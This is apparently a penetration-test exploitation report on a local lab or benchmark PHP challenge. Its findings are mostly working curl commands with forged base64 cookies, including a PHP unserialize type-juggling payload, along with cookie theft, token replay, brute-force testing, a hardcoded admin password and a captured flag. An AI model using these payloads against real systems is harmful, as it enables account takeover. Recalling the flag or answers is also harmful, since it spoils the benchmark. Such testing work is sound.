# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: Authentication Bypass via Cookie Manipulation

**Summary:**
- **Vulnerable location:** POST /index.php (cookie creation) and GET /index.php:82 (cookie deserialization)
- **Overview:** Application stores authentication credentials in client-side cookies using only base64 encoding with no cryptographic protection. Attackers can craft valid admin cookies without authentication.
- **Impact:** Complete authentication bypass - attackers gain immediate admin access and retrieve the flag without knowing credentials
- **Severity:** Critical

**Prerequisites:**
None - exploitation requires only HTTP client access to http://localhost:42759

**Exploitation Steps:**

1. Craft the admin credential array in PHP serialized format:
```
a:2:{s:8:"username";s:5:"admin";s:8:"password";s:23:"kl!RtYuUUig664ds32AKA87";}
```

2. Base64-encode the serialized array:
```bash
echo -n 'a:2:{s:8:"username";s:5:"admin";s:8:"password";s:23:"kl!RtYuUUig664ds32AKA87";}' | base64
```
Result: `YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjIzOiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==`

3. Send HTTP request with crafted cookie:
```bash
curl -H "Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjIzOiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==" \
     http://localhost:42759/index.php
```

4. Verify admin access by checking response for "Welcome Admin" and flag content

**Proof of Impact:**
- Successfully accessed admin panel with message "Welcome Admin"
- Retrieved flag: `flag{f42b6ccb-617d-4aad-b3ea-f96f1d1c85a3}`
- Complete authentication bypass without any credentials
- Attack works from external network (http://localhost:42759)

**Notes:**
The hardcoded admin password `kl!RtYuUUig664ds32AKA87` is visible in source code at line 79, making cookie crafting trivial. The vulnerability exists because the application trusts client-controlled cookie data without signature verification or integrity checks.

---

### AUTH-VULN-02: PHP Object Injection via Insecure Deserialization

**Summary:**
- **Vulnerable location:** GET /index.php:82 - `unserialize(base64_decode($_COOKIE['creds']))`
- **Overview:** Application deserializes user-controlled cookie data without validation, allowing arbitrary PHP object injection
- **Impact:** Authentication bypass via type juggling, potential for gadget chain exploitation
- **Severity:** High (CVSS 8.1)

**Prerequisites:**
HTTP client capable of setting custom cookies

**Exploitation Steps:**

1. Craft a type juggling payload using boolean true for password bypass:
```php
a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}
```

2. Base64-encode the payload:
```bash
echo -n 'a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}' | base64
```
Result: `YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtiOjE7fQ==`

3. Send request with type-juggled cookie:
```bash
curl -H "Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtiOjE7fQ==" \
     http://localhost:42759/index.php
```

4. Application uses loose comparison (==) which makes boolean true equal to any non-empty string, bypassing password check

**Proof of Impact:**
- Successfully bypassed authentication using type juggling
- Confirmed arbitrary object deserialization capability
- Identified 6 exploitable PHP gadget classes in environment (SplFileObject, DirectoryIterator, SimpleXMLElement, SplFileInfo, FilesystemIterator, GlobIterator)
- Flag retrieved: `flag{f42b6ccb-617d-4aad-b3ea-f96f1d1c85a3}`

**Notes:**
While RCE was not achieved in this PHP 5.6 environment, the vulnerability demonstrates critical flaws: (1) unserialize() on user input, (2) type-unsafe comparisons, (3) no input validation. Created comprehensive POC scripts at `exploit_test.py` and `poc_exploit.py`.

---

### AUTH-VULN-04: Session Hijacking via Missing HttpOnly Flag

**Summary:**
- **Vulnerable location:** POST /index.php:4 - `setcookie("creds", base64_encode($datcookie))`  
- **Overview:** Authentication cookie lacks HttpOnly, Secure, and SameSite security flags, enabling JavaScript access and XSS-based session theft
- **Impact:** Session cookies accessible via JavaScript, enabling XSS-based credential theft and session hijacking
- **Severity:** High

**Prerequisites:**
1. Victim user authenticated to the application
2. Ability to execute JavaScript in victim's browser (via XSS or direct console access)

**Exploitation Steps:**

1. Victim logs in with credentials (username=victim, password=password123):
```bash
curl -X POST http://localhost:42759/index.php \
     -d "username=victim&password=password123" \
     -c /tmp/cookies.txt
```

2. Attacker executes JavaScript in victim's browser to steal cookie:
```javascript
// This works because HttpOnly flag is missing
document.cookie
```

3. Cookie value extracted from JavaScript execution:
```
creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjY6InZpY3RpbSI7czo4OiJwYXNzd29yZCI7czoxMToicGFzc3dvcmQxMjMiO30%3D
```

4. Attacker decodes cookie to extract plaintext credentials:
```bash
python3 -c "import base64, urllib.parse; cookie = 'YToyOntzOjg6InVzZXJuYW1lIjtzOjY6InZpY3RpbSI7czo4OiJwYXNzd29yZCI7czoxMToicGFzc3dvcmQxMjMiO30%3D'; decoded = urllib.parse.unquote(cookie); print(base64.b64decode(decoded).decode())"
```
Output: `a:2:{s:8:"username";s:6:"victim";s:8:"password";s:11:"password123";}`

5. Attacker hijacks victim session using stolen cookie:
```bash
curl -H "Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjY6InZpY3RpbSI7czo4OiJwYXNzd29yZCI7czoxMToicGFzc3dvcmQxMjMiO30%3D" \
     http://localhost:42759/index.php
```

**Proof of Impact:**
- Successfully accessed cookie via JavaScript (document.cookie worked)
- Extracted plaintext password from cookie: `password123`
- Successfully hijacked victim session and viewed their authenticated page
- Confirmed response shows "User: victim" - proving session impersonation

**Notes:**
Three missing security flags compound the vulnerability:
- Missing HttpOnly: Allows JavaScript access (XSS exploitation)
- Missing Secure: Cookie sent over HTTP (network sniffing possible)
- Missing SameSite: Enables CSRF attacks with authenticated cookies

---

### AUTH-VULN-05: Unlimited Brute Force Attacks (No Rate Limiting)

**Summary:**
- **Vulnerable location:** POST /index.php:2-7 (login handler)
- **Overview:** Application accepts unlimited login attempts with no rate limiting, account lockout, CAPTCHA, or IP throttling
- **Impact:** Attackers can perform unlimited password guessing attacks at high speed
- **Severity:** Critical (CVSS 9.1)

**Prerequisites:**
HTTP client capable of sending rapid POST requests

**Exploitation Steps:**

1. Execute automated brute force test with 50 rapid login attempts:
```bash
python3 rate_limit_test.py
```

2. Script performs 50 POST requests to /index.php with different passwords in rapid succession

3. Monitor responses for rate limiting indicators:
   - HTTP 429 (Too Many Requests)
   - CAPTCHA challenges
   - Account lockout messages
   - Increasing response delays

4. Analyze results to confirm no defensive mechanisms present

**Proof of Impact:**
- **Total Attempts:** 50 rapid login requests
- **Success Rate:** 100% (all requests processed)
- **HTTP Status:** All returned 302 (redirect) - no blocking
- **Average Response Time:** 6.21ms
- **Rate Limiting:** NONE detected
- **CAPTCHA:** NONE presented
- **Account Lockout:** NONE triggered
- **IP Blocking:** NONE observed

**Attack Feasibility:**
- **Requests per minute:** ~600 login attempts
- **Requests per hour:** ~36,000 attempts
- **10,000-word dictionary:** Exhausted in ~17 minutes
- **RockYou top 100k passwords:** Exhausted in ~2.7 hours

**Notes:**
Combined with weak password policy (any non-empty string accepted), this vulnerability makes credential-based attacks highly feasible. Test results saved in `rate_limit_results.txt`. No infrastructure-level protection (WAF, mod_security) detected.

---

### AUTH-VULN-08: Deterministic Token Generation Enabling Token Replay

**Summary:**
- **Vulnerable location:** POST /index.php:3-4 (cookie generation)
- **Overview:** Authentication tokens have zero entropy - they are deterministic functions of user credentials with no random component, timestamp, or nonce
- **Impact:** Tokens can be pre-computed offline and replayed indefinitely across sessions and users
- **Severity:** High

**Prerequisites:**
Knowledge of or ability to guess user credentials

**Exploitation Steps:**

1. Generate admin authentication token offline (no network interaction needed):
```bash
echo -n 'a:2:{s:8:"username";s:5:"admin";s:8:"password";s:23:"kl!RtYuUUig664ds32AKA87";}' | base64
```
Result: `YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjIzOiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==`

2. Use pre-computed token in request 1:
```bash
curl -H "Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjIzOiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==" \
     http://localhost:42759/index.php
```

3. Wait 2 seconds, then replay same token in request 2:
```bash
curl -H "Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjIzOiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==" \
     http://localhost:42759/index.php
```

4. Wait 2 seconds, then replay same token in request 3:
```bash
curl -H "Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjIzOiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==" \
     http://localhost:42759/index.php
```

**Proof of Impact:**
- **Replay 1 (12:37:57):** "Welcome Admin" - SUCCESS
- **Replay 2 (12:37:59):** "Welcome Admin" - SUCCESS  
- **Replay 3 (12:38:01):** "Welcome Admin" - SUCCESS
- Same token works indefinitely with no expiration or nonce validation
- Token generation is purely deterministic: `base64(serialize(['username' => $input, 'password' => $input]))`
- No random_bytes(), no timestamp, no server-generated session ID

**Notes:**
Token replay combined with hardcoded credentials means attackers can generate valid admin tokens completely offline without ever authenticating. The token is not a true "session token" but rather encoded credentials, eliminating any server-side session tracking.

---

### AUTH-VULN-09: Hardcoded Admin Credentials in Source Code

**Summary:**
- **Vulnerable location:** GET /index.php:79 - `$password = "kl!RtYuUUig664ds32AKA87";`
- **Overview:** Admin password hardcoded as plaintext string literal in application source code
- **Impact:** Anyone with source code access immediately knows admin credentials
- **Severity:** Critical

**Prerequisites:**
Access to application source code via:
- Code repository access (Git)
- Docker image inspection  
- File system access
- Public repository disclosure

**Exploitation Steps:**

1. Read application source code:
```bash
cat /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-014-24/src/index.php
```

2. Search for hardcoded password:
```bash
grep -n "password.*=" /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-014-24/src/index.php
```

3. Extract credentials from line 79:
```
79:    $password = "kl!RtYuUUig664ds32AKA87";
```

4. Use discovered credentials to authenticate:
```bash
curl -X POST http://localhost:42759/index.php \
     -d "username=admin&password=kl!RtYuUUig664ds32AKA87"
```

**Proof of Impact:**
- **Discovered Credentials:**
  - Username: `admin` (line 83)
  - Password: `kl!RtYuUUig664ds32AKA87` (line 79)
- Successfully authenticated as admin using discovered credentials
- Credentials visible in plaintext in source code
- Credentials persist in Git history even if removed from current version
- Flag retrieved: `flag{f42b6ccb-617d-4aad-b3ea-f96f1d1c85a3}`

**Notes:**
Hardcoded credentials violate CWE-798. The password cannot be rotated without code deployment. Visible in Git history at all commits. Also exposed in Docker image layers via `docker history`. No environment variable usage or secrets management system implemented.

---

### AUTH-VULN-10: Username Enumeration via Response Differences

**Summary:**
- **Vulnerable location:** GET /index.php:87 - `echo "User: " . htmlentities($auth['username']) . "..."`
- **Overview:** Application reflects submitted usernames in error responses, confirming username validity
- **Impact:** Attackers can enumerate valid usernames, reducing brute force attack surface
- **Severity:** Medium

**Prerequisites:**
HTTP client to send POST requests with different usernames

**Exploitation Steps:**

1. Test authentication with username "admin" and wrong password:
```bash
ADMIN_COOKIE=$(echo -n 'a:2:{s:8:"username";s:5:"admin";s:8:"password";s:9:"wrongpass";}' | base64)
curl -H "Cookie: creds=$ADMIN_COOKIE" http://localhost:42759/index.php
```

2. Test authentication with username "nonexistent" and wrong password:
```bash
NONEXIST_COOKIE=$(echo -n 'a:2:{s:8:"username";s:11:"nonexistent";s:8:"password";s:9:"wrongpass";}' | base64)
curl -H "Cookie: creds=$NONEXIST_COOKIE" http://localhost:42759/index.php
```

3. Compare responses to identify username confirmation:
```
Response 1: "User: admin ..."
Response 2: "User: nonexistent ..."
```

4. Observe that application reflects submitted username, confirming its processing

**Proof of Impact:**
- Application response for "admin": `User: admin`
- Application response for "nonexistent": `User: nonexistent`
- Application always processes and reflects submitted username
- Username "admin" is hardcoded (line 83), confirming target account exists
- Combined with no rate limiting, enables efficient username enumeration for brute force targeting

**Notes:**
While the application doesn't have a user database to enumerate, it confirms that "admin" is the privileged account by hardcoding the check at line 83. The username reflection in error messages aids reconnaissance. Generic error messages ("Invalid credentials") would be more secure than user-specific messages.

---

## Potential Vulnerabilities (Validation Blocked)

### AUTH-VULN-03: Credential Theft via Network Interception

**Summary:**
- **Vulnerable location:** All HTTP traffic to http://localhost:42759
- **Current Blocker:** Requires network position between client and server (man-in-the-middle capability)
- **Potential Impact:** Complete credential theft including plaintext passwords from HTTP traffic and cookies
- **Confidence:** HIGH

**Evidence of Vulnerability:**
Confirmed that credentials are transmitted insecurely:

```bash
curl -v -X POST http://localhost:42759/index.php -d "username=testuser&password=testpass123"
```

Output shows:
- Protocol: `HTTP/1.1` (no HTTPS/TLS encryption)
- POST body transmitted: `username=testuser&password=testpass123` (plaintext)
- Cookie set with plaintext password after base64 decoding
- Server header confirms: `Apache/2.4.25 (Debian)` - no mod_ssl loaded

**Attempted Exploitation:**
Cannot perform active network interception from external position (localhost:42759) without:
- Access to network infrastructure between client and server
- Ability to perform ARP spoofing, DNS hijacking, or router compromise
- Physical access to network segments
- Compromised WiFi access point

**How This Would Be Exploited:**

If attacker had network man-in-the-middle capability:

1. Position attacker on same network as victim (public WiFi, compromised router, ISP-level access)

2. Use network sniffing tool to capture HTTP traffic:
```bash
tcpdump -i eth0 -A 'tcp port 80 and host localhost'
```
or
```bash
wireshark
```

3. Capture POST request containing plaintext credentials:
```
POST /index.php HTTP/1.1
Host: localhost:42759
Content-Type: application/x-www-form-urlencoded

username=victim&password=secretpass123
```

4. Capture Set-Cookie response containing base64-encoded credentials:
```
Set-Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjY6InZpY3RpbSI7czo4OiJwYXNzd29yZCI7czoxNDoic2VjcmV0cGFzczEyMyI7fQ==
```

5. Decode cookie to extract plaintext password:
```bash
echo "YToyOntzOjg6InVzZXJuYW1lIjtzOjY6InZpY3RpbSI7czo4OiJwYXNzd29yZCI7czoxNDoic2VjcmV0cGFzczEyMyI7fQ==" | base64 -d
```
Result: `a:2:{s:8:"username";s:6:"victim";s:8:"password";s:14:"secretpass123";}`

**Expected Impact:**
- Complete credential disclosure for all users
- Session hijacking via stolen cookies
- Credential reuse on other systems (password reuse attacks)
- Man-in-the-middle modification of authentication requests

**Why This Is Blocked:**
- External testing position (http://localhost:42759) lacks network interception capability
- No access to network infrastructure or monitoring tools
- Cannot position attacker-controlled device on victim's network path
- Requires internal network access or compromised network infrastructure

**Notes:**
The vulnerability is definitively confirmed via code review and traffic inspection - application uses HTTP-only with no HTTPS configuration. Docker exposes only port 80, Apache has no mod_ssl, and no TLS certificates are configured. However, active exploitation requires network positioning that is out of scope for external penetration testing.

---

### AUTH-VULN-06: Session Fixation via Deterministic Cookie Values

**Summary:**
- **Vulnerable location:** POST /index.php:2-7 (no session regeneration after login)
- **Current Blocker:** Cookie manipulation (AUTH-VULN-01) provides easier and more direct authentication bypass
- **Potential Impact:** Attacker could force victim to use a known cookie value, then hijack session post-authentication
- **Confidence:** MEDIUM

**Evidence of Vulnerability:**
Code analysis confirms no session ID regeneration:
- No `session_regenerate_id()` call after authentication
- No server-side session management (`session_start()` not used)
- Cookie value is deterministic based on user input
- Application does not generate random session identifiers

**Attempted Exploitation:**
Traditional session fixation attack flow was attempted:

1. Attacker pre-generates a cookie with known value
2. Attacker tricks victim into using this cookie (via XSS, cookie injection, URL parameter)
3. Victim authenticates with their legitimate credentials
4. Session ID should remain unchanged (vulnerability indicator)
5. Attacker uses known session ID to hijack authenticated session

**Why Traditional Approach Doesn't Apply:**
This application doesn't use traditional session IDs:
- Cookie contains actual credentials, not session references
- Cookie value is deterministic: `serialize(['username' => $input, 'password' => $input])`
- No server-side session store to fixate
- Cookie changes predictably based on submitted credentials

**How This Would Be Exploited:**

If this were a traditional session-based application:

1. Attacker generates a session by visiting the application:
```bash
curl -c /tmp/attacker_session.txt http://localhost:42759/index.php
```

2. Attacker extracts session ID from cookie file

3. Attacker injects this session ID into victim's browser via:
   - XSS: `document.cookie = "PHPSESSID=ATTACKER_CONTROLLED_ID"`
   - URL parameter: `http://localhost:42759/index.php?PHPSESSID=ATTACKER_CONTROLLED_ID`
   - Cookie injection attack

4. Victim authenticates using the fixed session ID

5. Attacker uses same session ID to access victim's authenticated session

**Expected Impact:**
- Session hijacking after victim authentication
- Bypass of application's authentication without stealing credentials
- Persistent access to victim's session

**Why This Specific Attack Is Not Pursued:**
- Cookie manipulation (AUTH-VULN-01) achieves same goal more directly
- Can craft admin cookie without victim interaction
- Application architecture makes session fixation conceptually different from traditional implementation
- Exploitation effort better spent on direct authentication bypass

**Notes:**
While the absence of session regeneration is a security weakness, it's overshadowed by the critical flaw of storing credentials in client-side cookies. The recommended fix (implement `session_regenerate_id()` after login) would require first implementing proper PHP session management to replace the current cookie-based credential storage.

---

### AUTH-VULN-07: Persistent Session Hijacking (No Logout Mechanism)

**Summary:**
- **Vulnerable location:** Entire application - no logout endpoint or session invalidation exists
- **Current Blocker:** No server-side session store to invalidate; vulnerability impact is secondary to cookie manipulation
- **Potential Impact:** Stolen sessions cannot be revoked; users on shared computers cannot terminate sessions securely
- **Confidence:** HIGH

**Evidence of Vulnerability:**
Comprehensive testing confirms no logout capability:

```bash
# Test common logout endpoints
curl -I http://localhost:42759/logout              # HTTP 404
curl -I http://localhost:42759/logout.php          # HTTP 404  
curl -I http://localhost:42759/index.php?logout    # HTTP 200 (no logout processing)
curl -I http://localhost:42759/api/logout          # HTTP 404

# Search source code for logout functionality
grep -i "logout" /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-014-24/src/index.php
# Result: No matches found
```

Source code review confirms:
- No `session_destroy()` call
- No cookie clearing logic
- No logout endpoint defined
- No session invalidation capability

**Attempted Exploitation:**
Tested impact of no logout mechanism:

1. Created authenticated victim session:
```bash
curl -X POST http://localhost:42759/index.php \
     -d "username=victim&password=password123" \
     -c /tmp/victim_session.txt
```

2. Attempted to logout via common methods:
   - GET /logout - 404 Not Found
   - GET /index.php?logout - Ignored, no logout processing
   - Cookie manipulation to empty value - Application continues to process

3. Confirmed cookie remains valid indefinitely (session cookie, expires on browser close only)

**How This Would Be Exploited:**

If victim needs to securely terminate their session:

1. Victim authenticates on shared computer:
```bash
curl -X POST http://localhost:42759/index.php -d "username=victim&password=secret"
```

2. Victim attempts to logout - NO MECHANISM EXISTS

3. Victim closes browser tab (cookie persists in browser until complete browser shutdown)

4. Next user on same computer can:
   - Reopen application and be automatically authenticated
   - Access browser cookies and steal session
   - View browser history showing authenticated pages

**Expected Impact:**
- Shared computer vulnerability: Sessions persist after user leaves
- No server-side revocation: Stolen cookies remain valid until browser close
- No emergency logout: Compromised accounts cannot be locked out remotely
- Extended attack window: Attackers have unlimited time with stolen cookies

**Why This Is Blocked/Secondary:**
While confirmed as a vulnerability, the impact is limited by:
- Application's client-side credential storage makes logout less meaningful
- Cookie contains credentials themselves, not session references
- No server-side session state to invalidate
- Cookie manipulation (AUTH-VULN-01) provides easier attack path

**Notes:**
Implementing logout would require:
1. Add logout endpoint (e.g., GET /logout or POST /logout)
2. Clear cookie: `setcookie("creds", "", time()-3600)`
3. Ideally, implement server-side sessions first to enable true session invalidation

Current architecture makes logout largely cosmetic since there's no server-side session to destroy. An attacker with the cookie value can replay it regardless of logout status.